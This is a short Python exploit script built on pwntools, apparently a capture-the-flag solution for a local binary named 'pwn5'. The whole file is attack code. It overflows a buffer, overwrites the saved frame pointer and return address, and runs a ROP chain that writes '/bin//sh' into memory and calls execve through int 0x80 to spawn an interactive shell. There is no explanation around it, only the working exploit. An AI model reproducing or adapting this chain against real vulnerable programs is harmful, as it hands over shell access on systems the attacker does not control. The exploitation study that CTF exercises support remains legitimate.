from pwn import *
from struct import pack

def do_rop():
	p = lambda x : pack('I', x)

	IMAGE_BASE_0 = 0x08048000 # bc3ba3d2fa792854482303396e8675a59ad6b2300e6c44a5261e55322576b6cb
	rebase_0 = lambda x : p(x + IMAGE_BASE_0)

	rop = ''

	rop += rebase_0(0x00070836) # 0x080b8836: pop eax; ret; 
	rop += '//bi'
	rop += rebase_0(0x0002768a) # 0x0806f68a: pop edx; ret; 
	rop += rebase_0(0x000a3060)
	rop += rebase_0(0x0000d01b) # 0x0805501b: mov dword ptr [edx], eax; ret; 
	rop += rebase_0(0x00070836) # 0x080b8836: pop eax; ret; 
	rop += 'n/sh'
	rop += rebase_0(0x0002768a) # 0x0806f68a: pop edx; ret; 
	rop += rebase_0(0x000a3064)
	rop += rebase_0(0x0000d01b) # 0x0805501b: mov dword ptr [edx], eax; ret; 
	rop += rebase_0(0x0000365a) # 0x0804b65a: pop dword ptr [ecx]; ret; 
	rop += p(0x00000000)
	rop += rebase_0(0x00070836) # 0x080b8836: pop eax; ret; 
	rop += p(0x00000000)
	rop += rebase_0(0x0002768a) # 0x0806f68a: pop edx; ret; 
	rop += rebase_0(0x000a3068)
	rop += rebase_0(0x0000d01b) # 0x0805501b: mov dword ptr [edx], eax; ret; 
	rop += rebase_0(0x000001c9) # 0x080481c9: pop ebx; ret; 
	rop += rebase_0(0x000a3060)
	rop += rebase_0(0x000973bd) # 0x080df3bd: pop ecx; ret; 
	rop += rebase_0(0x000a3068)
	rop += rebase_0(0x0002768a) # 0x0806f68a: pop edx; ret; 
	rop += rebase_0(0x000a3068)
	rop += rebase_0(0x00070836) # 0x080b8836: pop eax; ret; 
	rop += p(0x0000000b)
	rop += rebase_0(0x00027c90) # 0x0806fc90: int 0x80; ret; 
	return rop

p = process("./pwn5")
data = p.recv()

binsh_addr = 0x80bc140
system_addr = 0x804ee30
buf = 'A'*13
ebp = 'BBBB'
eip = do_rop()
#eip = p32(int(system_addr, 16))
#padd = 'CCCC'

payload = buf+ebp+eip#p32(system_addr)+padd+p32(binsh_addr)
p.sendline(payload)
p.interactive()
